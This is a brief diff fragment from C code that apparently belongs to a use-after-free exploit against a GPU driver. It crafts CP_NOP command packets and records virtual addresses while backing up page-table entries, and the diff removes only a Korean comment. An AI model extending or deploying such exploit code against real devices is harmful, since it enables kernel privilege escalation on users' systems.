@@ -1454,7 +1454,6 @@ static int scan_uaf_and_collect(int fd,
 					for (int i = 0; i < 4; i++)
 						wcmd[wdw++] = cp_type7_packet(CP_NOP, 0);
 
-					/* 원본 PTE0(data[0:1]) 백업 */
 					if (*rb_count < MAX_FOUND_PAGES) {
 						uint8_t *slot = (uint8_t *)(gbuf + 0xb08 + (*rb_count) * 24);
 						*(uint64_t *)slot = current_va;
